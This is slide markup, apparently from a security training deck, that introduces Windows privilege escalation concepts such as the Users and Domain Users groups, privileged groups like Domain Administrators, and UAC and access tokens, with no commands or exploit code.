                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8553" y="476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10929" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10929" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12830" y="476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14731" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16631" y="1901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18057" y="3327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19482" y="4752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20433" y="6653"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20908" y="8553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21383" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21383" y="10454"/>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89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3501125" y="2804025"/>
              <a:ext cx="617725" cy="1104800"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="44192" w="24709">
                  <a:moveTo>
                    <a:pt x="12355" y="44192"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="21859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12355" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="24709" y="21859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12355" y="44192"/>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1" name="Shape 711"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="712" name="Google Shape;712;p90"/>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Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="713" name="Google Shape;713;p90"/>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714" name="Google Shape;714;p90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="588350"/>
            <a:ext cx="8537700" cy="595200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="365750" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>To further escalate our privileges on the user tstark, we need to better understand privileges and privilege escalation within Windows. In the </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>following section, we will cover:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="715" name="Google Shape;715;p90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="23882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716" name="Google Shape;716;p90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="30306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717" name="Google Shape;717;p90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="36731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718" name="Google Shape;718;p90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="17464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719" name="Google Shape;719;p90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="17170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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="720" name="Google Shape;720;p90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="23588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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="721" name="Google Shape;721;p90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="30012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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="722" name="Google Shape;722;p90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="36364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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="723" name="Google Shape;723;p90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="1717075"/>
            <a:ext cx="7073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200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>How Windows uses groups to organize permissions.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="724" name="Google Shape;724;p90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="2381588"/>
            <a:ext cx="7073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200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>How specific groups are important for privilege escalation.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="725" name="Google Shape;725;p90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="3023688"/>
            <a:ext cx="7073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200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>How to check Windows privileges for a user.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="726" name="Google Shape;726;p90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="3651425"/>
            <a:ext cx="7073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200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>The concept of User Account Control (UAC) and access tokens.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="727" name="Google Shape;727;p90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="4308300"/>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728" name="Google Shape;728;p90"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="427164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Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="729" name="Google Shape;729;p90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="4286600"/>
            <a:ext cx="7073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200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Privilege escalation paths and techniques.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>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3" name="Shape 733"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="734" name="Google Shape;734;p91"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="735" name="Google Shape;735;p91"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4264151" y="1335450"/>
            <a:ext cx="827450" cy="2023750"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="736" name="Google Shape;736;p91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457160" y="1569000"/>
            <a:ext cx="3848100" cy="4767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737" name="Google Shape;737;p91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="593369" y="1957788"/>
            <a:ext cx="261029" cy="144694"/>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738" name="Google Shape;738;p91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-12300" y="2288250"/>
            <a:ext cx="4298400" cy="1296600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="457200" spcFirstLastPara="1" rIns="457200" wrap="square" tIns="0">
            <a:noAutofit/>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The default group all new local users are added to. </a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="739" name="Google Shape;739;p91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4466800" y="2289397"/>
            <a:ext cx="4298400" cy="1296600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="457200" spcFirstLastPara="1" rIns="457200" wrap="square" tIns="0">
            <a:noAutofit/>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The default group a new domain user is added to. </a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="740" name="Google Shape;740;p91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457150" y="1580838"/>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rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Users</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="741" name="Google Shape;741;p91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4876760" y="1557163"/>
            <a:ext cx="3848100" cy="4767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Light"/>
              <a:ea typeface="Roboto Light"/>
              <a:cs typeface="Roboto Light"/>
              <a:sym typeface="Roboto Light"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="742" name="Google Shape;742;p91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="5012969" y="1945951"/>
            <a:ext cx="261029" cy="144694"/>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91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4876750" y="1569000"/>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rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Domain Users</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="744" name="Google Shape;744;p91"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1418400" y="3839625"/>
            <a:ext cx="7306500" cy="649800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 16667" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="18287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lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Note:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> Both groups are considered low permission and only allowed </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>basic access, such as accessing the user’s own home folders in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
                <a:latin typeface="Inconsolata SemiBold"/>
                <a:ea typeface="Inconsolata SemiBold"/>
                <a:cs typeface="Inconsolata SemiBold"/>
                <a:sym typeface="Inconsolata SemiBold"/>
              </a:rPr>
              <a:t>C:\Users\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="745" name="Google Shape;745;p91"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="218813" y="3535384"/>
            <a:ext cx="1189274" cy="118927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49" name="Shape 749"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="750" name="Google Shape;750;p92"/>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latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
              </a:rPr>
              <a:t>Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="751" name="Google Shape;751;p92"/>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752" name="Google Shape;752;p92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="828375"/>
            <a:ext cx="4125000" cy="12021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1" lang="en">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>There are several “privileged” groups in Windows, both in a local and domain context, providing elevated privileges.</a:t>
            </a:r>
            <a:endParaRPr b="1">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="753" name="Google Shape;753;p92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2030475"/>
            <a:ext cx="4125000" cy="810600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="275"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>For example, members of the </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Domain Administrators </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1800"/>
              <a:t>group can create new users, reset passwords, and modify group policies.</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="275"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="754" name="Google Shape;754;p92"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5255375" y="468875"/>
            <a:ext cx="3614300" cy="4254800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="755" name="Google Shape;755;p92"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="362763" y="3240925"/>
            <a:ext cx="2273012" cy="1744600"/>
            <a:chOff x="6326863" y="1445725"/>
            <a:chExt cx="2273012" cy="1744600"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="756" name="Google Shape;756;p92"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6345375" y="2101625"/>
              <a:ext cx="2254500" cy="365700"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:ln>
              <a:noFill/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="73150">
              <a:noAutofit/>
            </a:bodyPr>
